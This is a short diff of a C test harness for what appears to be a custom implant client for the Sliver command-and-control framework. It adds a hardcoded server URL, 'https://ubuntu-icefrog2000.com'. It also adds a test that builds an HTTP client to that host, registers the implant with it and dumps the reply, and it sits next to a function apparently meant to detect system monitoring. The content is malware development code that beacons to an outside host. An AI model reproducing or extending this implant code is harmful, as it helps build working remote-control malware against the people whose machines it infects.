@@ -938,7 +938,7 @@ void test50() {
 
 void test51() {
 	PSLIVER_HTTP_CLIENT pHttpClient = NULL;
-	pHttpClient = SliverSessionInit();
+	pHttpClient = SliverSessionInit("https://ubuntu-icefrog2000.com");
 	if (pHttpClient == NULL) {
 		return;
 	}
@@ -1015,8 +1015,20 @@ void test56() {
 	PBYTE pOutput = NULL;
 	DWORD cbOutput = 0;
 
-	pOutput = MarshalVarInt(0x1133557799, &cbOutput);
+	pOutput = MarshalVarInt(60000000000, &cbOutput);
 	HexDump(pOutput, cbOutput);
+}
+
+void test57() {
+	PSLIVER_HTTP_CLIENT pSliverClient = NULL;
+	PBYTE pOutput = NULL;
+	DWORD cbOutput = 0;
+
+	pSliverClient = SliverHttpClientInit("https://ubuntu-icefrog2000.com");
+	pOutput = RegisterSliver(pSliverClient, &cbOutput);
+	HexDump(pOutput, cbOutput);
+	FREE(pOutput);
+	FreeSliverHttpClient(pSliverClient);
 }
 
 VOID DetectMonitorSystem() {
@@ -1101,7 +1113,8 @@ int main() {
 	//test52();
 	//test53();
 	//test54();
-	test55();
+	//test55();
 	//test56();
+	test57();
 	return 0;
 }
